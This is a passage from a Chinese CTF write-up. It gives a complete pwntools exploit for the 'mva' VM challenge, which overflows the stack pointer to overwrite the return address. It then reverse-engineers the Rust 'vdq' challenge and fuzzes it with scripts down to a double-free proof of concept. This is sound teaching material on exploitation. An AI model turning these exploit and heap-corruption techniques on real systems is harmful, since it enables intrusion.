<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload+=pop(1)<br>payload+=pop(2)+ldr(0x11)+sub(2,2,0)<br>payload+=pop(3)+ldr(0xBB10)+add(3,3,0)<br></code></pre></td></tr></table></figure>

<p>既然已经有了地址，接下来就只需要完成返回地址覆盖即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#esp=0x800000000000010c<br>payload+=ldr(0x010C)+mv(0,-10)<br>payload+=ldr(0x0000)+mv(0,-9)<br>payload+=ldr(0x0000)+mv(0,-8)<br>payload+=ldr(0x8000)+mv(0,-7)<br><br>payload+=mv(3,0)+push(1)+mv(2,0)+push(1)+mv(1,0)+push(1)<br></code></pre></td></tr></table></figure>

<p>将虚拟机中的 esp 改为 0x800000000000010c 来绕过其数值检查，而在写内存时会通过乘以 2 的方式导致整数溢出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mov     [rbp+rax*2+stack], dx<br></code></pre></td></tr></table></figure>

<p>最后只需要正常的将我们已经放在寄存器中的返回地址一次覆盖返回地址即可。</p>
<p>完整EXP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level=&#x27;debug&#x27;<br>p=process(&quot;./mva&quot;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.31.so&#x27;&#125;)<br>elf=ELF(&quot;./mva&quot;)<br>libc=elf.libc<br><br>#gdb.attach(p,&quot;b*$rebase(0x17DC)\n&quot;)<br>def pack(op:int, p1:int = 0, p2:int = 0, p3:int = 0) -&gt; bytes:<br>    return (op&amp;0xff).to_bytes(1,&#x27;little&#x27;) + \<br>        (p1&amp;0xff).to_bytes(1,&#x27;little&#x27;) + \<br>        (p2&amp;0xff).to_bytes(1,&#x27;little&#x27;) + \<br>        (p3&amp;0xff).to_bytes(1,&#x27;little&#x27;)<br><br>def ldr(val):#2 byte<br>    return pack(0x01, 0, val &gt;&gt; 8, val)<br>def add(p1, p2, p3):<br>    return pack(0x02, p1, p2, p3)<br>def sub(p1, p2, p3):<br>    return pack(0x03, p1, p2, p3)<br>def shr(p1, p2):<br>    return pack(0x06, p1, p2)<br>def xor(p1, p2, p3):<br>    return pack(0x07, p1, p2, p3)<br>def push(p1):<br>    return pack(0x09, 0,0,p1)<br>def pop(p1):<br>    return pack(0x0a, p1)<br>def mul(p1, p2, p3):#leak<br>    return pack(0x0D, p1, p2, p3)<br>def mv(p1, p2):<br>    return pack(0x0E, p1, p2)<br>def sh():<br>    return pack(0x0F)<br><br>payload=b&#x27;&#x27;<br>payload+=ldr(0x1)+mul(0,-0x12+4,0)+push(1)<br>payload+=ldr(0x1)+mul(0,-0x12+5,0)+push(1)<br>payload+=ldr(0x1)+mul(0,-0x12+6,0)+push(1)<br>payload+=pop(1)<br>payload+=pop(2)+ldr(0x11)+sub(2,2,0)<br>payload+=pop(3)+ldr(0xBB10)+add(3,3,0)<br>payload+=ldr(0x010C)+mv(0,-10)<br>payload+=ldr(0x0000)+mv(0,-9)<br>payload+=ldr(0x0000)+mv(0,-8)<br>payload+=ldr(0x8000)+mv(0,-7)<br>payload+=mv(3,0)+push(1)+mv(2,0)+push(1)+mv(1,0)+push(1)<br>payload=payload.ljust(0x100,b&#x27;\0&#x27;)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<blockquote>
<p>但请注意，这个 exp 并不是百分比成功。由于每次运算只能对两字节进行，因此在低位进行运算时可以向上溢出一位，导致第二个地址和期望地址差了 1 ，但这属于误差，多跑几次就能成功。</p>
</blockquote>
<h3 id="vdq"><a href="#vdq" class="headerlink" title="vdq"></a>vdq</h3><h4 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h4><p>二进制程序是由rust写的，IDA的反编译结果显得非常混乱。<br>跑起来后没有提示任何操作，只能根据IDA推测其提供的服务。<br>根据函数名，我们能够大致推测出程序的逻辑，main函数的主要代码只有两行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vdq::get_opr_lst::h470c4d46db5f8252(&amp;v0);//读取opr<br>vdq::handle_opr_lst::h7fb2393547b96358(v1.buf.alloc.gap0);//处理opr<br></code></pre></td></tr></table></figure>

<p>进入<strong>get_opr_lst</strong>之后，注意到如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">core::result::Result&lt;alloc::vec::Vec&lt;vdq::Operation&gt;,serde_json::error::Error&gt; v29;<br>serde_json::de::from_str::h2ed086b1a84205ca(&amp;v29, v12);<br></code></pre></td></tr></table></figure>

<p>因此我们就可以推测，程序提供了一个反序列化服务，v29是其对象。<br>接下来就向下搜索反序列化的关键字和翻译格式。<br>顺着如下函数向下搜索：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">  vdq::get_opr_lst::h470c4d46db5f8252(&amp;v0);<br><br>  serde_json::de::from_str::h2ed086b1a84205ca(&amp;v29, v12);<br><br>  serde_json::de::from_trait::h010df4f45829b4ad(retstr, read);<br><br>serde::de::impls::_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$alloc..vec..Vec$LT$T$GT$$GT$::deserialize::h3d140fae89f3cb33<br><br>_$LT$$RF$mut$u20$serde_json..de..Deserializer$LT$R$GT$$u20$as$u20$serde..de..Deserializer$GT$::deserialize_seq::hbd3934c1f9eb2161<br><br>_$LT$serde..de..impls..$LT$impl$u20$serde..de..Deserialize$u20$for$u20$alloc..vec..Vec$LT$T$GT$$GT$..deserialize..VecVisitor$LT$T$GT$$u20$as$u20$serde..de..Visitor$GT$::visit_seq::h004d517e1abba1bd<br><br>serde::de::SeqAccess::next_element::h66a6a37c3fe5b12c<br><br>_$LT$serde_json..de..SeqAccess$LT$R$GT$$u20$as$u20$serde..de..SeqAccess$GT$::next_element_seed::hdf4677aba76d625b<br><br>_$LT$core..marker..PhantomData$LT$T$GT$$u20$as$u20$serde..de..DeserializeSeed$GT$::deserialize::ha3e4760fc98c681a<br><br>vdq::_::_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$vdq..Operation$GT$::deserialize::h5d3aaf882e3017d5<br><br>_$LT$$RF$mut$u20$serde_json..de..Deserializer$LT$R$GT$$u20$as$u20$serde..de..Deserializer$GT$::deserialize_enum::h4c7b4e2d01c35d8<br><br>_$LT$vdq.._..$LT$impl$u20$serde..de..Deserialize$u20$for$u20$vdq..Operation$GT$..deserialize..__Visitor$u20$as$u20$serde..de..Visitor$GT$::visit_enum::he6941ccdf9c46f1c<br><br>serde::de::EnumAccess::variant::hc394608857e1e375<br><br>_$LT$serde_json..de..UnitVariantAccess$LT$R$GT$$u20$as$u20$serde..de..EnumAccess$GT$::variant_seed::h3111f0a59a2c8909<br><br>_$LT$core..marker..PhantomData$LT$T$GT$$u20$as$u20$serde..de..DeserializeSeed$GT$::deserialize::hae2cb777484d7d0f<br><br>_$LT$vdq.._..$LT$impl$u20$serde..de..Deserialize$u20$for$u20$vdq..Operation$GT$..deserialize..__Field$u20$as$u20$serde..de..Deserialize$GT$::deserialize::h771926e8bf89d42b<br><br>_$LT$$RF$mut$u20$serde_json..de..Deserializer$LT$R$GT$$u20$as$u20$serde..de..Deserializer$GT$::deserialize_identifier::h043dc575c5a1b557<br><br>_$LT$$RF$mut$u20$serde_json..de..Deserializer$LT$R$GT$$u20$as$u20$serde..de..Deserializer$GT$::deserialize_str::h8ad76558a0a689aa<br><br>_$LT$vdq.._..$LT$impl$u20$serde..de..Deserialize$u20$for$u20$vdq..Operation$GT$..deserialize..__FieldVisitor$u20$as$u20$serde..de..Visitor$GT$::visit_str::h9d16723e30de37b2<br></code></pre></td></tr></table></figure>

<p>最终能够在最后一个函数处找到解析关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">core::result::Result&lt;vdq::_::&#123;&#123;impl&#125;&#125;::deserialize::__Field,serde_json::error::Error&gt; *__cdecl _$LT$vdq.._..$LT$impl$u20$serde..de..Deserialize$u20$for$u20$vdq..Operation$GT$..deserialize..__FieldVisitor$u20$as$u20$serde..de..Visitor$GT$::visit_str::h9d16723e30de37b2(core::result::Result&lt;vdq::_::&#123;&#123;impl&#125;&#125;::deserialize::__Field,serde_json::error::Error&gt; *retstr, vdq::_::_&#123;impl&#125;&#125;::deserialize::__FieldVisitor self, _str __value)<br>&#123;<br>  _str v3; // rdx<br>  _str v4; // rdx<br>  _str v5; // rdx<br>  _str v6; // rdx<br>  _str v7; // rdx<br>  unsigned __int64 v8; // r8<br>  unsigned __int64 v9; // rsi<br>  core::result::Result&lt;vdq::_::&#123;&#123;impl&#125;&#125;::deserialize::__Field,serde_json::error::Error&gt; *v11; // [rsp+28h] [rbp-30h]<br><br>  v3.data_ptr = &amp;unk_62AB2;                     // add<br>  v3.length = 3LL;<br>  if ( core::str::traits::_$LT$impl$u20$core..cmp..PartialEq$u20$for$u20$str$GT$::eq::he9d7a829c76bba8b(*&amp;retstr, v3) )<br>  &#123;<br>    LOWORD(v11) = 0;<br>  &#125;<br>  else<br>  &#123;<br>    v4.data_ptr = &amp;byte_62AB5;                  // remove<br>    v4.length = 6LL;<br>    if ( core::str::traits::_$LT$impl$u20$core..cmp..PartialEq$u20$for$u20$str$GT$::eq::he9d7a829c76bba8b(*&amp;retstr, v4) )<br>    &#123;<br>      LOWORD(v11) = 256;<br>    &#125;<br>    else<br>    &#123;<br>      v5.data_ptr = &amp;unk_62ABB;                 // append<br>      v5.length = 6LL;<br>      if ( core::str::traits::_$LT$impl$u20$core..cmp..PartialEq$u20$for$u20$str$GT$::eq::he9d7a829c76bba8b(<br>             *&amp;retstr,<br>             v5) )<br>      &#123;<br>        LOWORD(v11) = 512;<br>      &#125;<br>      else<br>      &#123;<br>        v6.data_ptr = &amp;unk_62AC1;               // archive<br>        v6.length = 7LL;<br>        if ( core::str::traits::_$LT$impl$u20$core..cmp..PartialEq$u20$for$u20$str$GT$::eq::he9d7a829c76bba8b(<br>               *&amp;retstr,<br>               v6) )<br>        &#123;<br>          LOWORD(v11) = 768;<br>        &#125;<br>        else<br>        &#123;<br>          v7.data_ptr = &amp;unk_62AA4;             // view<br>          v7.length = 4LL;<br>          if ( core::str::traits::_$LT$impl$u20$core..cmp..PartialEq$u20$for$u20$str$GT$::eq::he9d7a829c76bba8b(<br>                 *&amp;retstr,<br>                 v7) )<br>          &#123;<br>            LOWORD(v11) = 1024;<br>          &#125;<br>          else<br>          &#123;<br>            serde::de::Error::unknown_variant::hc8291a7390e93cb5(<br>              retstr,<br>              __PAIR128__(&amp;off_7BD80, v9),<br>              __PAIR128__(v8, (&amp;stru_2._marker + 3)));<br>            LOBYTE(v11) = 1;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  return v11;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>不过需要注意，rust编译后的字符串相互连接，通过长度来确定具体的字符串内容；而IDA的分析会将整个字符串一并解析，以至于难以准确理解代码，具体表现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">v3.data_ptr = &amp;unk_62AB2;                     // add<br>v3.length = 3LL;<br>v4.data_ptr = &amp;byte_62AB5;                  // remove<br>v4.length = 6LL;<br></code></pre></td></tr></table></figure>

<p>字符串在IDA中的样式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">unsigned char ida_chars[] =&#123;<br>0x41, 0x64, 0x64, 0x52, 0x65, 0x6D, 0x6F, 0x76, 0x65, 0x41,<br>0x70, 0x70, 0x65, 0x6E, 0x64&#125;;<br>//AddRemoveAppend<br></code></pre></td></tr></table></figure>

<p>根据上述函数能够分析出具体有哪些操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Add、Remove、Append、Archive、View<br></code></pre></td></tr></table></figure>

<p>并且继续向上跟踪，可以知道其输入格式是：<br>(事实上如果熟悉反序列化就不用苦恼了，不过笔者也试着搜索过，搜出格式以后直接套也行，不过难道有这种机会，还是试着逆了一下)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[&quot;Add&quot;,&quot;Add&quot;,&quot;Remove&quot;]<br>$<br></code></pre></td></tr></table></figure>

<p>在知道具体的输入以后，就可以尝试fuzz来进行输入测试了。</p>
<p>但笔者不得不在这里提一句，如果您熟悉rust中的enum或实际拥有编译条件的话，在如下函数就能直接找到答案，不需要一步步深入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> // local variable allocation has failed, the output may be wrong!<br>core::result::Result&lt;vdq::Operation,serde_json::error::Error&gt; *__cdecl vdq::_::_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$vdq..Operation$GT$::deserialize::h5d3aaf882e3017d5(core::result::Result&lt;vdq::Operation,serde_json::error::Error&gt; *retstr, serde_json::de::Deserializer&lt;serde_json::read::StrRead&gt; *__deserializer)<br>&#123;<br>  __int64 v2; // r9 OVERLAPPED<br>  _str v3; // rdx<br>  core::marker::PhantomData&lt;&amp;u8&gt; *v4; // r8<br>  vdq::_::_&#123;impl&#125;&#125;::deserialize::__Visitor v6; // [rsp+0h] [rbp-38h]<br><br>  v3.length = &amp;off_7BD80;<br>  v4 = &amp;stru_2._marker + 3;<br>  v3.data_ptr = (&amp;stru_2 + 7);<br>  return _$LT$$RF$mut$u20$serde_json..de..Deserializer$LT$R$GT$$u20$as$u20$serde..de..Deserializer$GT$::deserialize_enum::h4c7b4e2d01c35d85(retstr,&amp;unk_62AA9,v3,*(&amp;v2 - 1),v6);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>阅读函数命deserialize_enum大概能够知道这是rust编译后的enum表示函数，unk_62AA9是其中的数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0000000000062AA9 aOperationaddre db &#x27;OperationAddRemoveAppendArchive&#x27;<br></code></pre></td></tr></table></figure>

<p>结合 <strong>handle_opr_lst</strong> 可知对应的代码应该是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">enum vdq::Operation :  __int8&#123; <br>    Add = 0x0,<br>    Remove = 0x1,<br>    Append = 0x2,<br>    Archive = 0x3,<br>    View = 0x4&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h4><p>这里参考一下cj神的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> # fuzz.sh<br>#!/bin/bash<br>while ((1))<br>do <br>    python ./vdq_input_gen.py &gt; poc<br>    cat poc  ./vdq<br>    if [ $? -ne 0 ]; then<br>        break<br>    fi<br>done<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># vdq_input_gen.py<br>#!/usr/bin/env python<br># coding=utf-8<br>import random<br>import string<br>operations = &quot;[&quot;<br>def Add():<br>    global operations<br>    operations += &quot;\&quot;Add\&quot;, &quot;<br>def Remove():<br>    global operations<br>    operations += &quot;\&quot;Remove\&quot;, &quot;<br>def Append():<br>    global operations<br>    operations += &quot;\&quot;Append\&quot;, &quot;<br>def View():<br>    global operations<br>    operations += &quot;\&quot;View\&quot;, &quot;<br>def Archive():<br>    global operations<br>    operations += &quot;\&quot;Archive\&quot;, &quot;<br>def DoOperations():<br>    print(operations[:-2] + &quot;]&quot;)<br>    print(&quot;$&quot;)<br>def DoAdd(message):<br>    print(message)<br>def DoAppend(message):<br>    print(message)<br>total_ops = random.randint(1, 20)<br>total_adds = 0<br>total_append = 0<br>total_remove = 0<br>total_message = 0<br>for i in range(total_ops):<br>    op = random.randint(0, 4)<br>    if op == 0:<br>        total_message += 1<br>        total_adds += 1<br>        Add()<br>    elif op == 1:<br>        total_adds -= 1<br>        Remove()<br>    elif op == 2:<br>        if total_adds &gt; 0:<br>            total_append += 1<br>            total_message += 1<br>            Append()<br>        Append()<br>    elif op == 3:<br>        total_adds = 0<br>        total_append = 0<br>        total_remove = 0<br>        Archive()<br>    elif op == 4:<br>        View()<br>DoOperations()<br>for i in range(total_message):<br>    DoAdd(&#x27;&#x27;.join(random.sample(string.ascii_letters + string.digits, random.randint(1, 40))))<br></code></pre></td></tr></table></figure>

<p>不过笔者修改了total_ops的数量，让最后的poc尽可能短一些，否则可能对分析造成额外的负担：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[&quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;View&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Add&quot;]<br>$<br>L3K9MFZ5Hos<br>ACETa0hO4Hx1Zzwt8Q7vs3fFSI<br>ylFsXgqDKMRLUePjZ6C2YfB3TcxiI5unm<br>vbKotjPBxTmkSyg0rUJ1lheZNVau<br>mP7E8dYDrxFnu2hjWeAHVMcqaCkTgI4N<br>KC9Ba<br>M42AY8Z0UIdwmNHLDeJWit5<br></code></pre></td></tr></table></figure>

<p>可以根据poc的逻辑适当缩减操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> [&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Append&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Remove&quot;,&quot;Add&quot;]<br>$<br>Add note [1] with message : <br>1<br>Add note [2] with message : <br>2<br>Add note [3] with message : <br>3<br>Archive note [1]<br>Add note [4] with message : <br>4<br>Removed note [2]<br>Append with message : <br>5<br>Add note [5] with message : <br>5<br>Cached notes:<br> -&gt; 35<br> -&gt; 4<br> -&gt; 5<br>Removed note [3]<br>Removed note [4]<br>Add note [6] with message : <br>6<br>free(): double free detected in tcache 2<br></code></pre></td></tr></table></figure>

<h4 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h4><p>根据上述的poc和情况可以分析出每条指令的用处。<br>##### Add<br>添加一条信息，但该信息总是加入队尾，即便前面的位置空出来也是如此。<br>##### Remove<br>删除一条信息，但该信息总是从队头删除。<br>##### Append<br>向当前队头的信息中添加额外的信息进行拼接（如上述情况，队头信息由 “3” 转至 “35”）。<br>##### View<br>打印当前所有的信息。<br>##### Archive<br>从队首获取一个信息，情况于Remove相似，但它并不会将用以储存消息的容器也释放掉，相当于只增加一次 tail。</p>
<p>进一步缩减poc，像Append就明显不太有用，但笔者尝试删除用以显示数据的View时却发现程序正常执行了，这说明View操作是必要的；以及，当笔者试图减少相同数量的Add和Remove时也发现不能等价，因此笔者根据测试得到的最短poc如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;,&quot;Add&quot;, &quot;View&quot;,&quot;Remove&quot;,&quot;Add&quot;]<br>$<br>Add note [1] with message : <br>1<br>Add note [2] with message : <br>2<br>Add note [3] with message : <br>3<br>Removed note [1]<br>Add note [4] with message : <br>4<br>Removed note [2]<br>Add note [5] with message : <br>5<br>Cached notes:<br> -&gt; 3<br> -&gt; 4<br> -&gt; 5<br>Removed note [3]<br>Add note [6] with message : <br>6<br>free(): double free detected in tcache 2<br></code></pre></td></tr></table></figure>

<p>但奇怪的是，本该无关紧要的 View 操作却是必要的，如果删去该操作，程序又会继续执行下去，因此再看看源代码中 View 部分的实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">case 4u:                                  // View<br>    core::fmt::Arguments::new_v1::h44adc30b070cf8c4(&amp;v45, __PAIR128__(1LL, &amp;stru_7BBC0), unk_62828);<br>    std::io::stdio::_print::h0d31d4b9faa6e1ec();<br>    alloc::collections::vec_deque::VecDeque$LT$T$GT$::make_contiguous::he6debc29b2205434(&amp;v12, &amp;stru_7BBC0);<br>    v1 = &amp;v12;<br>    alloc::collections::vec_deque::VecDeque$LT$T$GT$::iter::h0cc194c5561ce1ed(&amp;v46, &amp;v12);<br>    core::iter::traits::iterator::Iterator::for_each::h73567d402a60c07d(v10, &amp;v46);<br></code></pre></td></tr></table></figure>

<p><strong>make_contiguous</strong> 显得十分可疑，于是去查了一下官方文档：<a target="_blank" rel="noopener" href="https://doc.rust-lang.org/std/collections/struct.VecDeque.html#method.make_contiguous">doc.rust-lang.org</a></p>
<blockquote>
<p>Rearranges the internal storage of this deque so it is one contiguous slice, which is then returned.</p>
</blockquote>
<p>大致意思就是将容器中的数据重新紧凑排列到内存中。</p>
<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>首先需要先清楚整个容器的储存方式。因为符号表没抹掉，所以能直接拿到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//容器本身<br>alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note&gt;&gt;<br>&#123;<br>   __int32 tail;<br>   __int32 head;<br>   alloc::raw_vec::RawVec&lt;alloc::boxed::Box&lt;vdq::Note&gt;,alloc::alloc::Global&gt; buf;<br>&#125;<br></code></pre></td></tr></table></figure>

